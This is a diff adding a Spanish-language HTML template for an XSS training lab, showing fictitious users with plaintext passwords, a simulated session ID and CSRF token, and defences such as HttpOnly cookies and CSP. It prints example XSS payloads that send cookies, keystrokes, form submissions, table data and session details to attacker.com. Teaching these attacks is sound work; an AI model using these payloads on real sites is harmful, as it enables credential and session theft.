@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Usuarios de Prueba</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <a href="/" class="logo">🔍 LAB XSS</a>
+            <nav>
+                <ul class="nav">
+                    <li><a href="/">← Volver al Inicio</a></li>
+                    <li><a href="/users">👥 Usuarios</a></li>
+                    <li><a href="/about">ℹ️ Acerca de</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <div class="container">
+        <h1 class="page-title">👥 Usuarios de Prueba</h1>
+        <p class="page-subtitle">Datos que podrías "robar" usando XSS en un escenario real</p>
+
+        <!-- Info Box -->
+        <div class="info-box warning">
+            <div class="info-title">⚠️ Datos Sensibles Simulados</div>
+            <p>Esta página muestra datos ficticios de usuarios que representan información que un atacante podría robar mediante XSS:</p>
+            <ul style="margin-top: 1rem; margin-left: 2rem; color: #8b949e;">
+                <li><strong style="color: #ffaa00;">Cookies de sesión</strong> - Accesibles vía <code style="color: #00ff41;">document.cookie</code></li>
+                <li><strong style="color: #ffaa00;">Información de perfil</strong> - Nombres, emails, roles</li>
+                <li><strong style="color: #ffaa00;">Credenciales</strong> - En este caso visibles (en apps reales, estarían hasheadas)</li>
+            </ul>
+        </div>
+
+        <!-- Users Table -->
+        <h2 style="color: #00d9ff; margin: 2rem 0 1rem 0;">📋 Base de Datos de Usuarios</h2>
+        <div class="table-container">
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Usuario</th>
+                        <th>Email</th>
+                        <th>Contraseña</th>
+                        <th>Rol</th>
+                        <th>Fecha de Registro</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for usuario in usuarios %}
+                    <tr>
+                        <td>{{ usuario.id }}</td>
+                        <td><strong style="color: #00ff41;">{{ usuario.username }}</strong></td>
+                        <td>{{ usuario.email }}</td>
+                        <td><code style="color: #ff4444;">{{ usuario.password }}</code></td>
+                        <td>
+                            {% if usuario.role == 'Administrador' %}
+                            <span style="color: #ff4444; font-weight: bold;">🔑 {{ usuario.role }}</span>
+                            {% else %}
+                            <span style="color: #00d9ff;">{{ usuario.role }}</span>
+                            {% endif %}
+                        </td>
+                        <td style="color: #8b949e;">{{ usuario.created_at[:10] }}</td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+
+        <!-- Cookie Info -->
+        <div class="info-box success" style="margin-top: 3rem;">
+            <div class="info-title">🍪 Información de Cookies (Simulada)</div>
+            <p>En una aplicación real, podrías robar cookies de sesión con XSS:</p>
+            <div class="code-block" style="margin-top: 1rem;">
+                <code id="cookie-display">// Cookies actuales:
+document.cookie</code>
+            </div>
+            <button onclick="showCookies()" class="btn" style="margin-top: 1rem;">Ver Cookies Reales</button>
+        </div>
+
+        <!-- XSS Examples -->
+        <div class="info-box danger" style="margin-top: 2rem;">
+            <div class="info-title">💀 Ejemplos de Robo de Datos con XSS</div>
+            <p><strong>1. Robar Cookies y Enviarlas a un Servidor Externo:</strong></p>
+            <div class="code-block">
+                <code>&lt;script&gt;
+fetch('https://attacker.com/steal', {
+    method: 'POST',
+    body: JSON.stringify({
+        cookies: document.cookie,
+        users: document.querySelector('table').innerHTML
+    })
+});
+&lt;/script&gt;</code>
+            </div>
+
+            <p style="margin-top: 1.5rem;"><strong>2. Crear un Keylogger:</strong></p>
+            <div class="code-block">
+                <code>&lt;script&gt;
+document.onkeypress = function(e) {
+    fetch('https://attacker.com/keys', {
+        method: 'POST',
+        body: e.key
+    });
+};
+&lt;/script&gt;</code>
+            </div>
+
+            <p style="margin-top: 1.5rem;"><strong>3. Modificar Formularios para Phishing:</strong></p>
+            <div class="code-block">
+                <code>&lt;script&gt;
+// Cambiar la acción de todos los formularios de login
+document.querySelectorAll('form').forEach(form => {
+    form.action = 'https://attacker.com/phish';
+});
+&lt;/script&gt;</code>
+            </div>
+
+            <p style="margin-top: 1.5rem;"><strong>4. Extraer Datos de la Página:</strong></p>
+            <div class="code-block">
+                <code>&lt;script&gt;
+// Extraer datos de la tabla de usuarios
+const tableData = [];
+document.querySelectorAll('table tbody tr').forEach(row => {
+    const cells = row.querySelectorAll('td');
+    tableData.push({
+        username: cells[1].textContent,
+        email: cells[2].textContent,
+        password: cells[3].textContent
+    });
+});
+
+// Enviar a servidor del atacante
+fetch('https://attacker.com/stolen-data', {
+    method: 'POST',
+    body: JSON.stringify(tableData)
+});
+&lt;/script&gt;</code>
+            </div>
+        </div>
+
+        <!-- Protection Tips -->
+        <div class="info-box" style="margin-top: 2rem;">
+            <div class="info-title">🛡️ Cómo Proteger Estos Datos</div>
+            <ul style="margin-top: 1rem; margin-left: 2rem; color: #8b949e;">
+                <li><strong style="color: #00ff41;">HTTPOnly Cookies:</strong> Las cookies marcadas como HTTPOnly no son accesibles desde JavaScript</li>
+                <li><strong style="color: #00ff41;">Secure Cookies:</strong> Solo se envían sobre HTTPS</li>
+                <li><strong style="color: #00ff41;">SameSite Cookies:</strong> Protegen contra CSRF y algunos XSS</li>
+                <li><strong style="color: #00ff41;">Content Security Policy:</strong> Previene la ejecución de scripts maliciosos</li>
+                <li><strong style="color: #00ff41;">Sanitización de Output:</strong> Escape de HTML en todo contenido dinámico</li>
+                <li><strong style="color: #00ff41;">Principio de Menor Privilegio:</strong> No exponer más datos de los necesarios</li>
+            </ul>
+        </div>
+
+        <!-- Session Info -->
+        <div class="info-box" style="margin-top: 2rem;">
+            <div class="info-title">🔐 Información de Sesión (Simulada)</div>
+            <div style="margin-top: 1rem; font-family: 'Courier New', monospace;">
+                <p><strong style="color: #00d9ff;">Usuario Actual:</strong> <span id="current-user">admin</span></p>
+                <p><strong style="color: #00d9ff;">ID de Sesión:</strong> <span id="session-id">a3f7k9m2p5q8r1t4</span></p>
+                <p><strong style="color: #00d9ff;">Token CSRF:</strong> <span id="csrf-token">9b2c4e6f8a0d1c3e5g7i9k1m3o5q7s</span></p>
+                <p><strong style="color: #00d9ff;">Última Actividad:</strong> <span id="last-activity"></span></p>
+                <p><strong style="color: #00d9ff;">IP del Cliente:</strong> <span id="client-ip">192.168.1.100</span></p>
+            </div>
+            <div class="code-block" style="margin-top: 1rem;">
+                <code>// Código XSS para robar sesión:
+&lt;script&gt;
+const sessionData = {
+    user: document.getElementById('current-user').textContent,
+    sessionId: document.getElementById('session-id').textContent,
+    csrfToken: document.getElementById('csrf-token').textContent,
+    cookies: document.cookie
+};
+// Enviar a servidor del atacante
+fetch('https://attacker.com/session-hijack', {
+    method: 'POST',
+    body: JSON.stringify(sessionData)
+});
+&lt;/script&gt;</code>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <p>🔐 Usuarios de Prueba | <a href="/" style="color: #00d9ff;">Volver al menú principal</a></p>
+    </footer>
+
+    <script>
+        // Mensaje educativo en consola
+        console.log('%c👥 Página de Usuarios de Prueba', 'color: #00ff41; font-size: 18px; font-weight: bold;');
+        console.log('%c⚠️  Estos son los datos que podrías robar con XSS', 'color: #ffaa00; font-size: 12px;');
+        console.log('%c💡 document.cookie:', document.cookie || '(sin cookies)');
+
+        // Mostrar tiempo actual
+        document.getElementById('last-activity').textContent = new Date().toLocaleString('es-ES');
+
+        // Función para mostrar cookies
+        function showCookies() {
+            const cookies = document.cookie || 'No hay cookies disponibles en este contexto';
+            document.getElementById('cookie-display').textContent = 
+                '// Cookies actuales:\n' + cookies;
+            
+            console.log('%c🍪 Cookies:', 'color: #00d9ff; font-size: 14px;', cookies);
+            alert('Cookies mostradas en el código y en la consola.\n\nEn un ataque XSS real, estas serían enviadas a un servidor malicioso.');
+        }
+
+        // Simular cookies de sesión (en producción real estas serían HTTPOnly)
+        console.log('%c⚠️  En una app real, las cookies de sesión deberían ser HTTPOnly', 'color: #ff4444; font-size: 12px;');
+        console.log('%c📚 HTTPOnly: document.cookie no puede leer estas cookies', 'color: #00d9ff; font-size: 11px;');
+        console.log('%c📚 Secure: Solo se envían sobre HTTPS', 'color: #00d9ff; font-size: 11px;');
+        console.log('%c📚 SameSite: Protege contra CSRF', 'color: #00d9ff; font-size: 11px;');
+
+        // Demostración educativa de datos accesibles
+        console.group('%c💀 Datos Accesibles con XSS', 'color: #ff4444; font-size: 14px; font-weight: bold;');
+        console.log('document.cookie:', document.cookie || '(vacío)');
+        console.log('localStorage:', Object.keys(localStorage).length + ' items');
+        console.log('sessionStorage:', Object.keys(sessionStorage).length + ' items');
+        console.log('document.location:', document.location.href);
+        console.log('document.referrer:', document.referrer || '(ninguno)');
+        console.groupEnd();
+    </script>
+</body>
+</html>
